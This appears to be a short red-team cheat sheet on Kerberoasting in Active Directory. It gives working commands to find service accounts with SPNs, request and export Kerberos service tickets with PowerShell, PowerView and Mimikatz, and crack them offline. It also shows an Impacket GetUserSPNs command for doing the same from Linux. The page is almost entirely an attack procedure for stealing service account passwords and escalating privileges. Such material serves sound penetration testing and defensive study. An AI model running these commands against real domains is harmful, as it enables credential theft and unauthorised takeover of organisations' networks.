---
description: Kerberoast
---

# Kerberoast

> We can use Kerberoast for horizontal or vertical privesc. When the KDC TGS responds with TGS-REP, it is encrypted with the service NTLM hash. We can crack it offline.

**Considerations:**

* We do not present that TGS to the target service. Instead, we save it to the disk and brute-force offline.
* We target service user accounts, not machine accounts.
* Look for service accounts that can be privileged (Domain Admins...).
* If "serviceprincipalname" property is not null, then we can request a TGS for that service.

### Kerberoast from Windows

#### 1. Find User accounts used as service accounts

```bash
#PowerView:
Get-NetUser -SPN

#AD Module:
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

#### 2. Request a TGS

```bash
#Powershell:
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQL/$DOMAIN"

#PowerView:
Request-SPNTicket
```

#### 3. Verify we have the ticket

```bash
klist
```

#### 4. Export all tickets using Mimikatz

```bash
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

#### 5. Crack the service account password

```bash
#Using Kerberoast tool
python.exe .\tgsrepcrack.py .\$WORDLIST .\$TICKET_NAME.kirbi
```

### Kerberoast from Linux

```bash
#https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
python GetUserSPNs.py DOMAIN/pwneduser:pwnedcreds -outputfile hashes.kerberoast
```
